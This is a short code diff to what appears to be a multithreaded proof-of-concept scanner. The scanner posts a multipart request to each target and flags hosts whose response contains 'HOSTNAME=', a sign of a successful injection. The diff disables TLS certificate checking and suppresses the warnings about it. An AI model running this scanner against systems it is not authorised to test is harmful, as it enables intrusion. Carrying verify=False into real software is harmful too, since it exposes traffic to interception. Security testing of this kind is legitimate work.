@@ -13,6 +13,7 @@ from lib.consle_width import get_terminal_size
 lock = threading.Lock()
 scan_count = 0
 terminal_width = get_terminal_size()[0]
+requests.packages.urllib3.disable_warnings()
 
 
 def print_msg(msg, line_feed=False):
@@ -66,7 +67,7 @@ def poc():
             data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
                    'Content-Disposition: form-data; name="image1"\r\n' \
                    'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
-            resp = requests.post(host, data, headers=headers, timeout=(4, 20))
+            resp = requests.post(host, data, verify=False, headers=headers, timeout=(4, 20))
 
             if resp.text.find('HOSTNAME=') >= 0:
                 lock.acquire()
